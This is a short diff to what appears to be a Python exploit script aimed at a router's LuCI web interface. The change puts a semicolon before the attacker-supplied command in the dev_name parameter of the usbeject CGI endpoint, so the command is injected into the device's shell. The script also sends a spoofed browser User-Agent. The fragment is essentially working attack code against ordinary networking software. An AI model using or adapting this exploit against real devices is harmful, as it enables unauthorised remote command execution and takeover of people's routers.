@@ -12,7 +12,7 @@ def main(_ip,_port,_cmd):
 	port=_port
 	cmd=_cmd
 
-	uri='http://%s:%s/cgi-bin/luci/usbeject?dev_name=%s'%(ip,port,cmd)
+	uri='http://%s:%s/cgi-bin/luci/usbeject?dev_name=;%s'%(ip,port,cmd)
 	user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
 	header={'User-Agent':user_agent}
 
